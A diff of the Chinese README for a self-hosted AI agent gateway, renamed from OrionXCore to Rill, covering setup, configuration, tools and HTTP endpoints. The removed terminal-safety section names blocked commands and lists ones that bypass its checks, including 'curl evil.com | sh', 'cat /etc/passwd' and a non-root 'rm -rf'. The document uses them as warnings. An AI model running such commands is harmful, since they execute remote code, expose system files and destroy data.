@@ -1,394 +1,193 @@
-# OrionXCore 中文说明
+# Rill
 
-```
- ██████╗ ██████╗ ██╗ ██████╗ ███╗   ██╗██╗  ██╗
-██╔═══██╗██╔══██╗██║██╔═══██╗████╗  ██║╚██╗██╔╝
-██║   ██║██████╔╝██║██║   ██║██╔██╗ ██║ ╚███╔╝
-██║   ██║██╔══██╗██║██║   ██║██║╚██╗██║ ██╔██╗
-╚██████╔╝██║  ██║██║╚██████╔╝██║ ╚████║██╔╝ ██╗
- ╚═════╝ ╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝
+```text
+ █▀█ █ █   █
+ █▀▄ █ █   █
+ ▀ ▀ ▀ ▀▀▀ ▀▀▀
 ```
 
-OrionXCore 是一个轻量级、可配置的 AI 编程代理服务。只需要配置模型、API Key 和 API Base URL，启动服务即可提供标准 的HTTP 接口，为 cli、Web UI 或其他客户端提供ai-agent能力。
+**Less is more. Simplicity is beauty.**
 
-英文文档: [README.md](README.md)
+Rill 是一个轻量、自托管的 Agent Gateway：你提供一个 OpenAI 兼容模型和
+API Key，Rill 在服务端完成一轮或多轮模型调用、工具执行和结果整理，再通过
+HTTP、SSE 或 CLI 返回结果。
 
-**文档**: [安装指南](docs/INSTALL.md) | [架构文档](docs/ARCHITECTURE.md) | [依赖说明](docs/dependencies.md)
-
----
-
-## 为什么选择 OrionXCore？
-
-OrionXCore 与 **OpenAI Codex**、**Claude Code**、**GitHub Copilot** 等工具的主要区别：
-
-
-| 特性           | OrionXCore                          | Claude Code / Codex | Copilot    |
-| -------------- | ----------------------------------- | ------------------- | ---------- |
-| **部署方式**   | **自托管服务**                      | CLI/桌面应用        | IDE 扩展   |
-| **模型灵活性** | 任意 OpenAI 兼容 API                | 相对灵活配置        | 锁定供应商 |
-| **集成方式**   | **HTTP API**，任意客户端            | 仅直接使用          | 仅 IDE     |
-| **数据库工具** | 仅 ClickHouse + Text-to-SQL方式实现 | 所有数据库，mcp接入 | /          |
-| **文件系统**   | 可配置沙盒                          | 完全访问            | IDE 工作区 |
-| **定制化**     | 开源                                | 闭源                | 闭源       |
-| **多轮 Agent** | **服务端**循环                      | 客户端              | 单次请求   |
-
-### 核心优势
-
-1. **API 优先设计**: 暴露标准 REST/SSE 接口，任何客户端都可以调用——IDE 插件、Web UI、脚本或移动应用。
-2. **模型无关**: 支持任意 OpenAI 兼容 API（OpenAI、Azure、DeepSeek、本地模型如 Ollama/vLLM 等）。你控制模型，而不是供应商。
-3. **数据库原生**: 内置 ClickHouse 集成，支持 Text-to-SQL 工作流、Schema 探测和 SQL 错误自动重试。
-4. **沙盒执行**: 终端和文件系统工具具有可配置的安全边界——路径限制、大小限制、权限控制。
-5. **开源可定制**: 完全可定制。添加新工具、修改行为、与现有系统集成。
-
-### 适用场景
-
-- **你需要服务，而不是 CLI**: 想将 AI 编程集成到 Web 应用、IDE 插件或自动化流程中。
-- **你有自己的 LLM**: 使用自托管模型或替代供应商。
-- **你需要一个简单好用的clickhouse-mcp工具**: 对 ClickHouse 或类似数据仓库进行自然语言查询 ，（虽然ck官方有提供mcp server,但我觉得我这个用起来更方便，纯粹是基于个人需求做的的工具）。
-- **你想要控制**: 为你的环境定制安全策略、工具和行为。
-
----
-
-## 架构图
-
-```
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                              客户端                                          │
-│     ┌──────────┐     ┌──────────┐     ┌──────────┐     ┌──────────┐        │
-│     │   CLI    │     │  Web UI  │     │IDE 插件  │     │   脚本   │        │
-│     │  orionx  │     │          │     │          │     │          │        │
-│     └───┬──────┘     └───┬──────┘     └───┬──────┘     └───┬──────┘        │
-└─────────┼─────────────────┼─────────────────┼─────────────────┼─────────────┘
-          │                 │                 │                 │
-          └─────────────────┴────────┬────────┴─────────────────┘
-                                     │ HTTP (REST / SSE)
-                                     ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                         OrionXCore 服务                                      │
-│  ┌───────────────────────────────────────────────────────────────────────┐ │
-│  │                        API 层 (FastAPI)                                │ │
-│  │   /health    /v1/tools    /v1/agent/respond    /v1/agent/stream        │ │
-│  │                               /v1/chat/completions                     │ │
-│  └───────────────────────────────────────────────────────────────────────┘ │
-│                                     │                                        │
-│                                     ▼                                        │
-│  ┌───────────────────────────────────────────────────────────────────────┐ │
-│  │                     Agent 服务 (服务端循环)                            │ │
-│  │                                                                        │ │
-│  │     ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐          │ │
-│  │     │  请求   │───▶│   LLM   │───▶│  工具   │───▶│  响应   │          │ │
-│  │     │         │    │  调用   │    │  执行   │    │         │          │ │
-│  │     └─────────┘    └─────────┘    └─────────┘    └─────────┘          │ │
-│  │          │             │             │            ▲                   │ │
-│  │          │             │             └────────────┘                   │ │
-│  │          │             ▼             (循环直到完成)                    │ │
-│  │          │      ┌───────────┐                                           │ │
-│  │          └─────▶│  如有工具 │──────────────────────────▶               │ │
-│  │                 │  则继续  │                           │               │ │
-│  │                 └───────────┘                           │               │ │
-│  └───────────────────────────────────────────────────────────────────────┘ │
-│                                     │                                        │
-│          ┌──────────────────────────┼──────────────────────────┐           │
-│          ▼                          ▼                          ▼           │
-│  ┌───────────────┐          ┌───────────────┐          ┌───────────────┐   │
-│  │ 终端工具      │          │ 数据库工具    │          │ 文件系统工具  │   │
-│  │               │          │               │          │               │   │
-│  │ • Shell 执行  │          │ • ClickHouse  │          │ • 读/写文件   │   │
-│  │ • 风险检查    │          │ • Text-to-SQL │          │ • 列表/搜索   │   │
-│  │ • 路径限制    │          │ • Schema 探测 │          │ • 路径沙盒    │   │
-│  └───────────────┘          └───────────────┘          └───────────────┘   │
-└─────────────────────────────────────────────────────────────────────────────┘
-                                     │
-                                     ▼
-┌─────────────────────────────────────────────────────────────────────────────┐
-│                           外部服务                                           │
-│     ┌─────────────────┐           ┌─────────────────┐                       │
-│     │    LLM API      │           │   ClickHouse    │                       │
-│     │ (OpenAI/DeepSeek│           │    数据库       │                       │
-│     │   /Ollama/...)  │           │                 │                       │
-│     └─────────────────┘           └─────────────────┘                       │
-└─────────────────────────────────────────────────────────────────────────────┘
+```text
+客户端 -> Rill -> 模型
+                  |
+                  +-> 工具
 ```
 
-**核心特点:**
-- 🔁 **服务端 Agent 循环**: 多轮工具执行完全由服务端处理
-- 🔌 **API 优先**: REST/SSE 接口供任意客户端集成
-- 🛠️ **可插拔工具**: 终端、数据库、文件系统，带沙盒控制
-- 🧠 **模型无关**: 支持任意 OpenAI 兼容的 LLM
+## Why Rill？
 
----
+| 你的需求                   | 推荐                                | 原因                     |
+| ---------------------- | --------------------------------- | ---------------------- |
+| 终端里的成熟 AI coding agent | **Claude Code 或 Codex**           | 客户端体验和编程工作流更完整         |
+| IDE 编程助手               | **GitHub Copilot 或 IDE 原生 Agent** | 编辑器集成更深                |
+| 自托管 Agent API          | **Rill**                          | 一个小服务，接入任意 OpenAI 兼容模型 |
+| 服务端工具循环                | **Rill**                          | HTTP/SSE 接口简单，工具在服务端执行 |
+| 按需扩展工具                 | **Rill**                          | 小型可靠底座，配合 Skill 开发扩展   |
+| 小团队内部运维自动化             | **Rill**                          | 配置少、部署简单、权限可控          |
 
-## 目标
+Rill 适合放在你自己的客户端、模型和工具后面。
 
-- 终端执行能力（通过 Tool Calling）
-- 数据库自然语言查询 + Text-to-SQL 工作流
-- 多轮 Agent 执行（迭代规划与工具调用）
-- OpenAI 兼容的模型集成与可插拔工具
-- REST 和 SSE 接口供客户端集成
+## 架构
 
-从实际需求出发，不断完善以上服务端功能。
+```text
+CLI / Web UI / IDE 插件 / 脚本
+                |
+           REST / SSE
+                v
+       +-------------------+
+       |       Rill        |
+       | API + Agent 循环  |
+       | Provider 适配层   |
+       | Tool Registry     |
+       +---------+---------+
+                 |
+       +---------+----------+
+       |                    |
+  OpenAI 兼容模型接口     工具
+                       终端 / 文件
+                       ClickHouse
+                       图表（可选）
+```
 
-顺便做一些简单、好用的客户端工具。
-
----
-
-## 当前功能
-
-- FastAPI 服务：健康检查、工具发现、REST、SSE 接口
-- OpenAI 兼容的 `/chat/completions` 客户端
-- Agent 循环：支持工具调用直到完成
-- Terminal Tool：基础风险控制与命令执行
-- Database Tool：支持 ClickHouse，Text-to-SQL 工作流
-- Filesystem Tool：文件读写、目录操作、路径沙盒
-- Metrics Tool：业务指标查询与分析
-- Alert Tool：告警查询（PostgreSQL/OpenGauss）
-- Chart Tool：数据可视化
-- 环境变量驱动的配置
+`/v1/chat/completions` 只执行一轮兼容模型调用；`/v1/agent/*` 执行服务端
+Agent 循环，直到模型给出结果或达到限制。工具由配置启用，并经过权限、沙盒、
+超时、结果大小和审批策略检查。完整边界见[架构文档](docs/ARCHITECTURE.md)。
 
 ## 快速开始
 
-详细部署说明请参考 [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md)。
+### 安装 uv
 
-1. 创建虚拟环境并安装依赖：
+没有 uv 时先安装：
 
 ```bash
-python3 -m venv .venv
-source .venv/bin/activate
-pip install -e .
+curl -LsSf https://astral.sh/uv/install.sh | sh
 ```
 
-2. 复制配置模板并填写模型设置：
+### 本地运行
+
+在仓库根目录执行：
+
+```bash
+uv sync
+cp config.toml.example config.toml
+cp .env.example .env
+```
+
+编辑 `config.toml`，设置模型和模型服务地址：
+
+```toml
+[llm]
+model = "deepseek-v4-flash"
+api_base_url = "https://api.deepseek.com"
+```
+
+编辑 `.env`，填入 API Key：
+
+```bash
+ORIONXCORE_LLM__API_KEY=replace-me
+```
+
+检查并启动服务：
+
+```bash
+uv run rill config check
+uv run rill serve
+```
+
+`rill serve` 读取 `[server].host` 和 `[server].port`，默认监听
+`0.0.0.0:8080`。另开终端验证：
+
+```bash
+curl http://127.0.0.1:8080/health/ready
+uv run rill ask "列出当前工作区中的文件。"
+uv run rill chat
+```
+
+也可以用 `uv run uvicorn rill.main:app --host 0.0.0.0 --port 8080` 启动；
+这时监听地址由 Uvicorn 参数决定。
+
+### Docker
 
 ```bash
 cp config.toml.example config.toml
-export ORIONXCORE_LLM__API_KEY=your_api_key
+cp .env.example .env
 ```
 
-3. 启动服务：
+编辑 `config.toml` 中的 `[llm]`，并在 `.env` 中填入：
 
 ```bash
-uvicorn orionxcore.main:app --host 0.0.0.0 --port 8080
+ORIONXCORE_LLM__API_KEY=replace-me
 ```
 
-4. 使用 CLI：
+启动并检查：
 
 ```bash
-orionx ask "列出 monitor 库里的表。"
-orionx ask "统计 metrics 表总行数并做简要说明" --session-id demo
-orionx ask "显示原始 agent 响应" --raw
-orionx chat
+docker compose -f deploy/docker-compose.yml up -d --build
+curl http://127.0.0.1:8080/health/ready
 ```
 
-5. 打开浏览器调试页：
-
-```text
-http://127.0.0.1:8080/playground
-```
-
----
-
-## 配置
-
-复制 TOML 模板并编辑配置文件：
+停止服务：
 
 ```bash
-cp config.toml.example config.toml
+docker compose -f deploy/docker-compose.yml down
 ```
 
-`config.toml` 是主要配置来源。环境变量会覆盖 TOML 文件中的值，嵌套字段使用双下划线。例如：
+## 工具
+
+默认启用终端、文件系统和数据库工具；图表工具需要显式开启：生产环境请评估保留最小化工具开启。
 
 ```bash
-export ORIONXCORE_LLM__API_KEY=your_api_key
-export ORIONXCORE_LLM__MODEL=gpt-4.1-mini
+uv run rill tool list
+uv run rill tool enable tool_name
 ```
 
-API Key 等敏感信息应通过环境变量或 Secret 注入，不要写入 TOML 文件。
-可以使用 `ORIONXCORE_CONFIG_FILE` 指定其他 TOML 文件。配置在启动时加载，修改后需要重启服务。
-旧版的扁平变量（例如 `ORIONXCORE_MODEL`）不再读取。
-
-完整配置参考：[config.toml.example](config.toml.example)、[.env.example](.env.example) 和 [安装文档](docs/INSTALL.md)。
-
----
-
-## HTTP 接口
-
-### 健康检查
+终端和文件系统的写操作需要请求级批准：
 
 ```bash
-curl http://localhost:8080/health
+uv run rill ask \
+  --approve-tool run_terminal_command \
+  --approve-tool filesystem \
+  "列出当前工作区中的文件"
 ```
 
-### 获取可用工具列表
+HTTP 客户端在 Agent 请求中传入相同的 `approved_tools` 数组。OpenAI 兼容的
+`/v1/chat/completions` 由客户端负责工具调用；需要服务端自动循环时使用
+`/v1/agent/respond` 或 `/v1/agent/stream`。添加自定义工具的完整流程见
+[工具开发文档](docs/TOOLS.md)和[开发 Skill](skills/tool-development/SKILL.md)。
+
+## API
+
+| 入口 | 用途 |
+| --- | --- |
+| `GET /health/live` | 进程存活检查 |
+| `GET /health/ready` | 配置和工作区就绪检查 |
+| `GET /v1/models` | 查看配置的模型 |
+| `GET /v1/tools` | 查看已启用工具及审批元数据 |
+| `POST /v1/agent/respond` | 服务端执行 Agent 循环并返回完整结果 |
+| `POST /v1/agent/stream` | 以 SSE 流式返回 Agent 事件 |
+| `POST /v1/chat/completions` | OpenAI 兼容的一轮调用 |
+
+最小 Agent 请求：
 
 ```bash
-curl http://localhost:8080/v1/tools
+curl -sS -X POST http://127.0.0.1:8080/v1/agent/respond \
+  -H 'Content-Type: application/json' \
+  -d '{"messages":[{"role":"user","content":"列出工作区中的文件。"}]}'
 ```
 
-### Agent 请求
+## 文档
 
-```bash
-curl -X POST http://localhost:8080/v1/agent/respond \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [
-      {"role": "user", "content": "列出当前工作区中的文件，并总结项目结构。"}
-    ]
-  }'
-```
+- [配置](docs/CONFIGURATION.md)
+- [安装](docs/INSTALL.md)
+- [部署](docs/DEPLOYMENT.md)
+- [架构](docs/ARCHITECTURE.md)
+- [工具开发](docs/TOOLS.md)
+- [API 接口](docs/API.md)
+- [依赖](docs/dependencies.md)
+- [产品计划](docs/PRODUCT_PLAN.md)
 
-当 Agent 调用数据库工具时，`/v1/agent/respond` 会附带额外事件：
-`database_trace`、`database_schema_context`、`database_sql_attempt`、`database_result_summary`。
-
-### SSE 流式接口
-
-```bash
-curl -N -X POST http://localhost:8080/v1/agent/stream \
-  -H "Content-Type: application/json" \
-  -d '{
-    "messages": [
-      {"role": "user", "content": "检查当前目录并告诉我你发现了什么。"}
-    ]
-  }'
-```
-
-### OpenAI 兼容接口
-
-普通请求：
-
-```bash
-curl -X POST http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gpt-4.1-mini",
-    "messages": [
-      {"role": "user", "content": "总结一下这个项目。"}
-    ]
-  }'
-```
-
-带工具的请求：
-
-```bash
-curl -X POST http://localhost:8080/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "gpt-4.1-mini",
-    "messages": [
-      {"role": "user", "content": "检查当前工作区。"}
-    ],
-    "tools": [
-      {
-        "type": "function",
-        "function": {
-          "name": "run_terminal_command",
-          "description": "在配置好的工作目录中执行 Shell 命令。",
-          "parameters": {
-            "type": "object",
-            "properties": {
-              "command": {"type": "string"}
-            },
-            "required": ["command"]
-          }
-        }
-      }
-    ],
-    "tool_choice": "auto",
-    "parallel_tool_calls": false
-  }'
-```
-
-如果响应返回 `finish_reason: "tool_calls"`，客户端需执行工具，然后追加：
-
-- 包含 `tool_calls` 的 assistant 消息
-- 带 `tool_call_id`、`name` 和工具结果的 `tool` 消息
-
-再次调用 `/v1/chat/completions` 继续对话。
-
-### 浏览器 Playground
-
-访问 `/playground` 可在浏览器中调试 `/v1/agent/respond` 和 `/v1/chat/completions`，支持编辑 JSON 请求体和查看原始响应。
-
----
-
-## 数据库说明
-
-当前数据库工具仅支持 ClickHouse。
-
-- 连接串格式：`clickhousedb://username:password@localhost:8123/default`
-- 默认只允许只读查询
-- 只允许单条只读 SQL，不允许多语句执行
-- 返回行数由 `config.toml` 中的 `database.max_rows` 控制
-- 查询超时由 `database.query_timeout_seconds` 控制
-- Schema 探测支持 `list_tables` 和 `describe_table`
-- 自然语言查询支持最小版 `text_to_sql` 流程，SQL 执行失败时自动重试一次
-- 可通过 `database.allowed_databases` 限制访问白名单库
-- `text_to_sql` 返回包含 trace 信息：schema 上下文、生成 SQL、重试原因、最终 SQL
-- **错误处理**：SQL 执行异常会被捕获并返回错误信息，不会导致服务崩溃，Agent 可根据错误继续尝试
-
-默认情况下，数据库写操作是关闭的。仅在明确需要时开启：
-
-```env
-database.allow_mutation = true
-```
-
----
-
-## 文件系统说明
-
-文件系统工具在配置的工作区内提供安全的文件操作。
-
-- 启用：`filesystem.enabled = true`
-- 操作：`read_file`、`write_file`、`append_file`、`list_dir`、`make_dir`、`delete_file`、`move`、`stat`、`search`
-- **路径沙箱**：只允许 `filesystem.workdir` 内的操作，推荐使用独立目录如 `./workspace`
-- 读写大小限制：`filesystem.max_read_bytes` 和 `filesystem.max_write_bytes`（默认 1 MiB）
-- 写入/删除权限分别通过 `filesystem.allow_write` 和 `filesystem.allow_delete` 控制
-
-推荐配置：
-
-```env
-[filesystem]
-enabled = true
-workdir = "./workspace"
-allow_write = true
-allow_delete = false
-```
-
----
-
-## Terminal 安全说明
-
-Terminal 工具可执行任意 Shell 命令，风险较高。
-
-**已有保护机制**：
-- 风险命令检测：拦截 `rm -rf /`、`sudo`、`su`、`shutdown` 等极端危险命令
-- 工作目录限制：命令在 `terminal.workdir` 内执行
-- 超时限制：默认 30 秒
-
-**重要提示**：风险检测列表有限，以下命令会绕过检测：
-- `rm -rf ./data`（非根目录删除）
-- `cat /etc/passwd`（读取系统文件）
-- `curl evil.com | sh`（远程代码执行）
-
-**安全建议**：
-- 生产环境建议禁用 Terminal：`terminal.enabled = false`
-- 如需启用，使用隔离目录：`terminal.workdir = "./sandbox"`
-- 考虑使用 Docker 容器进一步隔离
-
----
-
-## 工具安全性对比
-
-| 工具 | 安全性 | 沙箱强度 | 建议场景 |
-|------|--------|----------|----------|
-| **Database** | ✅ 高 | 只读查询，自动重试 | 生产可用 |
-| **FileSystem** | ⚠️ 中 | 强制路径限制，无法绕过 | 启用，使用独立 workdir |
-| **Terminal** | ❌ 低 | 命令可用绝对路径绕过 | 开发环境使用，生产禁用 |
-
----
-
-## 下一步开发
-
-- Web 方式调用 demo
-- Terminal 命令审批流程（每个命令需用户确认）
-- 模型原生流式输出
-- 鉴权、限流、审计日志
+English: [README.md](README.md).
